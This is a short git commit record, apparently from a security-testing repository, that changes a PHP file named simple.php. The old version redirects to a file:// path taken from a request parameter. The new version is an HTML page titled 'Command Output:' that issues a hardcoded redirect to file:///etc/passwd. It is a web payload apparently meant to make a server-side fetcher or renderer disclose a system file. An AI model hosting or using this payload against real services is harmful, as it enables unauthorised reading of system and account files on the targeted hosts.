aa18ae1dade22614b4b7fdbb88edec2835bfd06f
datnt53 <44463004+datnt53@users.noreply.github.com>
2024-09-13 08:58:28 +0700

    Update simple.php

--- simple.php
+++ simple.php
@@ -1,1 +1,7 @@
-<?php header('location:file://'.$_REQUEST['x']); ?>
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>Command Output:</h1>
+<?php header('location:file:///etc/passwd'); ?>
+  </body>
+</html>
